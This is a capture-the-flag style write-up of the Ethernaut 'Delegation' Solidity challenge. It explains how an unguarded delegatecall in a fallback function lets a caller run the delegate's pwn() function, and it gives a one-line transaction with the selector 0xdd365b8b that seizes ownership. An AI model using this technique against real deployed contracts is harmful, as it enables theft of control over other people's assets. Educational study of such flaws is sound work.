# Ethernaut - Level 6 - Delegation

Contract code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

Objectives:
```
The goal of this level is for you to claim ownership of the instance you are given.
```

This contract was very interesting.

Here we have two contracts in the same file: a Delegation contract, and a Delegate contract.


The fallback method of the Delegation contract caught my attention.

Here we have a call to `delegatecall` on the Delegate contract. 

I've learnt that this is a typical design pattern to delegate the execution of dynamic methods to a delegate contract.

From the solidity documentation, we can see that the delegatecall method require a data argument, which is the first 4 bytes of the keccak256 hash of the function signature that we want to call on the Delegate contract.

In this case, we want to call the pwn() function. 

Its keccak256 hash is (only first 4 bytes) 0xdd365b8b.

```
contract.sendTransaction({from: player, to: contract.address, data: "0xdd365b8b"});
//Now we are owner of the contract :)
//You need to submit the instance
```
